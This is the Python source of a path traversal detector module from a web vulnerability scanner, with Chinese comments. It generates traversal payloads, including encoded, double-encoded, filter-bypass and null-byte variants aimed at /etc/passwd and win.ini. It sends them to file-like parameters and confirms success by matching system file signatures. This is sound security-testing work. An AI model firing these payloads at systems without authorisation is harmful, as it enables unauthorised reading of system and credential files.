"""
路径遍历检测器

检测目录遍历/路径遍历漏洞
"""

from typing import List, Optional, Dict, Any
import re
import logging
from urllib.parse import urlparse, parse_qs

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType
from ..factory import register_detector
from ..payloads import get_payloads, PayloadCategory

logger = logging.getLogger(__name__)


@register_detector('path_traversal')
class PathTraversalDetector(BaseDetector):
    """路径遍历检测器

    检测目录遍历漏洞，可能导致任意文件读取

    使用示例:
        detector = PathTraversalDetector()
        results = detector.detect("https://example.com/download", params={"file": "report.pdf"})
    """

    name = 'path_traversal'
    description = '路径遍历漏洞检测器'
    vuln_type = 'path_traversal'
    severity = Severity.HIGH
    detector_type = DetectorType.ACCESS
    version = '1.0.0'

    # 文件读取成功的标志
    FILE_SIGNATURES = {
        'unix': {
            '/etc/passwd': [
                r'root:x?:0:0:',
                r'daemon:x?:\d+:\d+:',
                r'bin:x?:\d+:\d+:',
                r'nobody:x?:\d+:\d+:',
            ],
            '/etc/shadow': [
                r'root:\$[16]\$',
                r'root:!:',
            ],
            '/etc/hosts': [
                r'127\.0\.0\.1\s+localhost',
                r'::1\s+localhost',
            ],
        },
        'windows': {
            'win.ini': [
                r'\[fonts\]',
                r'\[extensions\]',
                r'\[mci extensions\]',
                r'for 16-bit app support',
            ],
            'boot.ini': [
                r'\[boot loader\]',
                r'timeout=',
            ],
            'hosts': [
                r'127\.0\.0\.1\s+localhost',
            ],
        }
    }

    # 常见的文件参数名
    FILE_PARAMS = [
        'file', 'filename', 'path', 'filepath',
        'page', 'doc', 'document', 'folder',
        'root', 'dir', 'directory',
        'include', 'require', 'load',
        'template', 'view', 'layout',
        'img', 'image', 'download',
        'read', 'src', 'source',
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """初始化检测器

        Args:
            config: 配置选项
                - max_depth: 最大遍历深度
                - check_null_byte: 是否检测空字节截断
        """
        super().__init__(config)

        # 加载 payload
        self.payloads = self._enhance_payloads(
            get_payloads(PayloadCategory.PATH_TRAVERSAL)
        )

        # 编译文件签名模式
        self._file_patterns: Dict[str, Dict[str, List[re.Pattern]]] = {}
        for os_type, files in self.FILE_SIGNATURES.items():
            self._file_patterns[os_type] = {}
            for file_path, patterns in files.items():
                self._file_patterns[os_type][file_path] = [
                    re.compile(p, re.IGNORECASE) for p in patterns
                ]

        # 配置
        self.max_depth = self.config.get('max_depth', 10)
        self.check_null_byte = self.config.get('check_null_byte', True)

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测路径遍历漏洞

        Args:
            url: 目标 URL
            **kwargs:
                params: GET 参数字典
                data: POST 数据字典
                method: HTTP 方法
                headers: 请求头

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        params = kwargs.get('params', {})
        data = kwargs.get('data', {})
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        # 解析 URL 参数
        if not params:
            parsed = urlparse(url)
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        # 识别可能的文件参数
        file_params = self._identify_file_params(params)

        for param_name in file_params:
            # 测试 Unix 路径遍历
            unix_result = self._test_traversal(
                url, params, param_name, 'unix', method, headers
            )
            if unix_result:
                results.append(unix_result)
                continue

            # 测试 Windows 路径遍历
            windows_result = self._test_traversal(
                url, params, param_name, 'windows', method, headers
            )
            if windows_result:
                results.append(windows_result)

        self._log_detection_end(url, results)
        return results

    def _test_traversal(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        os_type: str,
        method: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试路径遍历

        Args:
            url: 目标 URL
            params: 参数字典
            param_name: 测试参数名
            os_type: 目标系统类型
            method: HTTP 方法
            headers: 请求头

        Returns:
            检测结果或 None
        """
        # 生成遍历 payload
        payloads = self._generate_traversal_payloads(os_type)

        for payload, target_file in payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = self.http_client.get(url, params=test_params, headers=headers)
                else:
                    response = self.http_client.post(url, data=test_params, headers=headers)

                # 检查文件内容
                if self._check_file_content(response.text, os_type, target_file):
                    request_info = self._build_request_info(
                        method=method,
                        url=url,
                        headers=headers,
                        params=test_params if method == 'GET' else None,
                        data=test_params if method != 'GET' else None
                    )
                    response_info = self._build_response_info(response)
                    return self._create_result(
                        url=url,
                        vulnerable=True,
                        param=param_name,
                        payload=payload,
                        evidence=self._extract_file_evidence(response.text, os_type, target_file),
                        confidence=0.95,
                        verified=True,
                        request=request_info,
                        response=response_info,
                        remediation="使用白名单验证文件路径，避免直接使用用户输入构造文件路径",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal"
                        ],
                        extra={
                            'os_type': os_type,
                            'target_file': target_file
                        }
                    )

            except Exception as e:
                logger.debug(f"路径遍历检测失败: {e}")

        return None

    def _generate_traversal_payloads(self, os_type: str) -> List[tuple]:
        """生成路径遍历 payload

        Args:
            os_type: 目标系统类型

        Returns:
            (payload, 目标文件) 列表
        """
        payloads = []

        if os_type == 'unix':
            target_files = ['/etc/passwd', '/etc/hosts']
            separators = ['../']
            encodings = [
                '',  # 原始
                '%2e%2e%2f',  # URL 编码
                '..%2f',  # 部分编码
                '%2e%2e/',  # 部分编码
                '....//....//....//....//....//....//....//....//....//',  # 过滤绕过
                '..%252f',  # 双重编码
            ]
        else:  # windows
            target_files = ['c:/windows/win.ini', 'c:\\windows\\win.ini']
            separators = ['..\\', '../']
            encodings = [
                '',
                '%2e%2e%5c',
                '..%5c',
                '%2e%2e\\',
            ]

        for target in target_files:
            for sep in separators:
                for depth in range(1, self.max_depth + 1):
                    # 基础遍历
                    traversal = sep * depth
                    if os_type == 'unix':
                        payload = traversal + 'etc/passwd'
                        payloads.append((payload, '/etc/passwd'))
                    else:
                        payload = traversal + 'windows/win.ini'
                        payloads.append((payload, 'win.ini'))

            # 编码变体
            for encoding in encodings:
                if encoding:
                    for depth in range(3, self.max_depth + 1):
                        traversal = encoding * depth
                        if os_type == 'unix':
                            payload = traversal + 'etc/passwd'
                            payloads.append((payload, '/etc/passwd'))
                        else:
                            payload = traversal + 'windows\\win.ini'
                            payloads.append((payload, 'win.ini'))

            # 空字节截断
            if self.check_null_byte:
                for depth in range(3, self.max_depth + 1):
                    if os_type == 'unix':
                        traversal = '../' * depth
                        payload = traversal + 'etc/passwd%00'
                        payloads.append((payload, '/etc/passwd'))
                        payload = traversal + 'etc/passwd%00.jpg'
                        payloads.append((payload, '/etc/passwd'))

        # 绝对路径
        if os_type == 'unix':
            payloads.extend([
                ('/etc/passwd', '/etc/passwd'),
                ('file:///etc/passwd', '/etc/passwd'),
            ])
        else:
            payloads.extend([
                ('c:\\windows\\win.ini', 'win.ini'),
                ('c:/windows/win.ini', 'win.ini'),
            ])

        return payloads[:50]  # 限制数量

    def _identify_file_params(self, params: Dict[str, str]) -> List[str]:
        """识别可能的文件参数

        Args:
            params: 参数字典

        Returns:
            文件参数名列表
        """
        file_params = []

        for param_name, value in params.items():
            param_lower = param_name.lower()

            # 检查参数名
            if any(fp in param_lower for fp in self.FILE_PARAMS):
                file_params.append(param_name)
                continue

            # 检查值是否像文件路径
            if self._looks_like_file_path(value):
                file_params.append(param_name)

        return file_params

    def _looks_like_file_path(self, value: str) -> bool:
        """判断值是否像文件路径"""
        if not value:
            return False

        # 包含路径分隔符
        if '/' in value or '\\' in value:
            return True

        # 包含文件扩展名
        if re.search(r'\.[a-z]{2,4}$', value.lower()):
            return True

        return False

    def _check_file_content(
        self,
        response_text: str,
        os_type: str,
        target_file: str
    ) -> bool:
        """检查响应是否包含目标文件内容

        Args:
            response_text: 响应文本
            os_type: 系统类型
            target_file: 目标文件

        Returns:
            是否匹配
        """
        patterns = self._file_patterns.get(os_type, {}).get(target_file, [])

        for pattern in patterns:
            if pattern.search(response_text):
                return True

        return False

    def _extract_file_evidence(
        self,
        response_text: str,
        os_type: str,
        target_file: str
    ) -> str:
        """提取文件内容证据

        Args:
            response_text: 响应文本
            os_type: 系统类型
            target_file: 目标文件

        Returns:
            证据文本
        """
        patterns = self._file_patterns.get(os_type, {}).get(target_file, [])

        for pattern in patterns:
            match = pattern.search(response_text)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end].strip()

        return ""

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        return self.payloads
